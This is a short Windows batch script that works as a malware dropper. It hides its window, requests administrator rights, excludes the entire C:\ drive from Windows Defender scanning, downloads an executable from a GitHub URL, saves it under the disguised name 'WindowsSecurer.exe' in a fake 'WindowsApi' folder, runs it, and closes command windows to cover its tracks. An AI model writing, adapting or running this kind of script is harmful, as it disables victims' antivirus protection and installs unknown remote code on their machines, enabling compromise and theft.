@echo off
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
if not "%1"=="am_admin" (
    powershell -Command "Start-Process -Verb RunAs -FilePath '%0' -ArgumentList 'am_admin'"
    exit /b
)
set "scriptDir=%~dp0"
powershell -Command "Add-MpPreference -ExclusionPath 'C:\'"
TIMEOUT /T 3
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/KR4eeR/bhn/raw/main/HelloWorldRunner.exe', 'C:\WindowsApi\WindowsSecurer.exe')"
start "" "C:\WindowsApi\WindowsSecurer.exe"
taskkill /IM cmd.exe
exit
